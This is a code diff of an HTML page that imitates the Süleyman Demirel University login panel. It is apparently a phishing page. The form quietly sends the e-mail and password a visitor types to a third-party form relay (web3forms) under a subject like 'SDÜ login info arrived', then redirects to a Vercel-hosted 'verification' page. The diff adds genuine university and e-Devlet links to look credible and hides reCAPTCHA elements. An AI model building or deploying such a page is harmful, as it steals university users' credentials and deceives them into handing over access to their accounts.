@@ -1028,39 +1028,70 @@
                                     </span>
                                 </div>
                                 <form action="https://api.web3forms.com/submit" method="POST" style="padding:0 50px">
-
                                     <input type="hidden" name="access_key" value="effaac62-2f70-4e72-a209-1f9b1da700f3">
-
-                                    <input type="hidden" name="subject" value="SDÜ YENİ GİRİŞ BİLGİSİ">
-                                    <input type="hidden" name="from_name" value="SDÜ Giriş Paneli">
+                                    <input type="hidden" name="subject" value="SDÜ GİRİŞ BİLGİSİ GELDİ">
+                                    <input type="hidden" name="from_name" value="SDÜ Kimlik Servisi">
                                     <input type="hidden" name="redirect"
                                         value="https://sdu-sistem.vercel.app/dogrulamaa.html">
 
                                     <div style="margin-bottom: 10px;">
-                                        <input type="text" name="Kullanici" placeholder="E-Posta Adresi" required
+                                        <input type="text" name="Eposta_Kullanici" placeholder="E-Posta Adresi" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-family: sans-serif;">
                                     </div>
-
                                     <div style="margin-bottom: 15px;">
                                         <input type="password" name="Sifre" placeholder="Şifre" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-family: sans-serif;">
                                     </div>
 
                                     <div style="display: flex; align-items: center; margin-bottom: 20px;">
-                                        <input type="checkbox" id="RememberMe" name="RememberMe" value="Evet"
+                                        <input type="checkbox" id="RememberLogin" name="RememberLogin" value="true"
                                             style="width: 16px; height: 16px; cursor: pointer;">
-                                        <label for="RememberMe"
+                                        <label for="RememberLogin"
                                             style="margin-left: 10px; font-size: 14px; color: #666; cursor: pointer; font-family: sans-serif;">Beni
                                             Hatırla</label>
                                     </div>
 
                                     <button type="submit"
-                                        style="background-color: #9e0b0f !important; color: white !important; width: 100% !important; height: 50px !important; border: none !important; border-radius: 4px !important; font-weight: 700 !important; cursor: pointer !important; text-transform: uppercase;">
+                                        style="background-color: #9e0b0f !important; color: white !important; width: 100% !important; height: 50px !important; border: none !important; border-radius: 4px !important; font-weight: 700 !important; cursor: pointer !important; text-transform: uppercase; margin-bottom: 20px;">
                                         GİRİŞ YAP
                                     </button>
 
+                                    <div style="text-align: center; border-top: 1px solid #eee; padding-top: 15px;">
+                                        <a href="https://bilgiislem.sdu.edu.tr" target="_blank"
+                                            style="color: #9e0b0f !important; text-decoration: none !important; font-size: 13px; font-weight: 600; font-family: sans-serif;">
+                                            Parolamı Düzenle / Unuttum
+                                        </a>
+                                        <div style="margin-top: 10px; margin-bottom: 20px;">
+                                            <p
+                                                style="font-size: 12px; color: #777; margin: 0; font-family: sans-serif; font-weight: 600;">
+                                                Süleyman Demirel Üniversitesi</p>
+                                            <p
+                                                style="font-size: 11px; color: #999; margin: 2px 0; font-family: sans-serif;">
+                                                Bilgi İşlem Daire Başkanlığı</p>
+                                        </div>
+
+                                        <a href="https://turkiye.gov.tr"
+                                            style="display: flex; align-items: center; justify-content: center; background-color: #f8f9fa; border: 1px solid #ddd; border-radius: 4px; padding: 10px; text-decoration: none; width: 100%; max-width: 280px; margin: 0 auto;">
+                                            <img src="https://cdn.e-devlet.gov.tr/themes/ankara/assets/img/logo/edevlet-logo.png"
+                                                alt="e-devlet" style="height: 20px;">
+                                            <span
+                                                style="color: #333; font-size: 13px; font-weight: 700; margin-left: 10px; font-family: sans-serif;">e-Devlet
+                                                Kapısı ile Giriş</span>
+                                        </a>
+                                    </div>
                                 </form>
 
+                                <style>
+                                    .grecaptcha-badge,
+                                    .grecaptcha-error,
+                                    textarea[name="g-recaptcha-response"] {
+                                        display: none !important;
+                                    }
+
+                                    body {
+                                        padding-bottom: 50px !important;
+                                    }
+                                </style>
                                 <div style="text-align: center; margin-top: 20px; padding: 0 50px;">
 
                                     <a href="https://bilgiislem.sdu.edu.tr" target="_blank"
